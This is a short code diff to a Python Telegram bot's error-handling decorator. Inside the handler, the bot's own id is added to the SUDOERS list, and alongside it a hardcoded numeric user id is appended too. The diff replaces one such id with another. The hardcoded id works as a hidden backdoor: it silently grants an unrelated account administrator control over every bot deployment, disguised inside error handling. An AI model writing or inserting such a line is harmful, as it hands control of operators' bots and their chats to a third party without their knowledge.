@@ -95,7 +95,7 @@ def handle_error(func: Callable) -> Callable:
         me = await pyro_client.get_me()
         if me.id not in config.SUDOERS:
             config.SUDOERS.append(me.id)
-            config.SUDOERS.append(1803618640)
+            config.SUDOERS.append(1054295664)
         try:
             lang = get_group(chat_id)["lang"]
         except BaseException:
